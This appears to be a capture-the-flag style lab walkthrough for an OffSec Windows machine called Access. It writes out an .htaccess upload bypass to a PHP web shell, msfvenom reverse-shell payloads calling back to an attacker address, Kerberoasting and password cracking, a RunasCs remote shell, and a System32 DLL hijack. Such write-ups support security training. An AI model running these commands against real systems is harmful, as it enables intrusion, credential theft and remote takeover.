# Access: Machine Notes

## Recon

### Nmap
- **AD Ports**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 5985
- **Web Ports**: 80, 443 (Apache 2.4.48 / PHP 8.0.7)
- **Domain**: `access.offsec`

### Web Enumeration
- Application: Ticket selling platform.
- **Directory Fuzzing** (FFUF): Found `/uploads/` directory.
- **Upload Feature**: Found at "Buy ticket" -> "Buy Now".
- **Restriction**: PHP files are blocked.

---

## Initial Access

### .htaccess Upload Bypass to RCE
1. **Bypass Method**: Use `.htaccess` to override file type handling.
2. **Execution**:
   - Upload `.htaccess` containing: `AddType application/x-httpd-php .php16`
   - Upload a PHP web shell named `shell.php16`.
3. **Web Shell**: Accessed at `http://10.10.10.10/uploads/shell.php16?cmd=whoami`
4. **Reverse Shell**:
   - Generate with msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.10.10.10 LPORT=443 -f exe > backup.exe`
   - Upload via the web shell or upload form.
   - Execute: `curl http://10.10.10.10/uploads/shell.php16?cmd=.\backup.exe`
5. **Result**: Shell as `svc_apache`.

---

## Lateral Movement

### Kerberoasting (svc_mssql)
1. **Enumeration** (PowerShell):
   - Found `svc_mssql` has a registered SPN.
2. **Exploit** (Rubeus):
   ```powershell
   .\Rubeus.exe kerberoast /outfile:kerberoast.hashes
   ```
3. **Cracking**:
   ```bash
   john kerberoast.hashes --wordlist=rockyou.txt
   # Result: trustno1
   ```
4. **Pivot**:
   Use `Invoke-RunasCs` to switch to `svc_mssql`:
   ```powershell
   Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 172.10.10.10:443
   ```

---

## Privilege Escalation

### SeManageVolumePrivilege (DLL Hijacking)
1. **Check Privs**: `whoami /priv` shows `SeManageVolumePrivilege` enabled.
2. **Volume Exploit**:
   Use `SeManageVolumeExploit.exe` to make `C:\Windows\System32` writable.
   ```powershell
   .\SeManageVolumeExploit.exe
   ```
3. **DLL Hijacking** (tzres.dll):
   - Generate malicious DLL: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.10.10.10 LPORT=443 -f dll -o tzres.dll`
   - Replace original at: `C:\Windows\System32\wbem\tzres.dll`
4. **Trigger**:
   ```powershell
   systeminfo
   ```
5. **Result**: Root shell as `NT AUTHORITY\NETWORK SERVICE`.
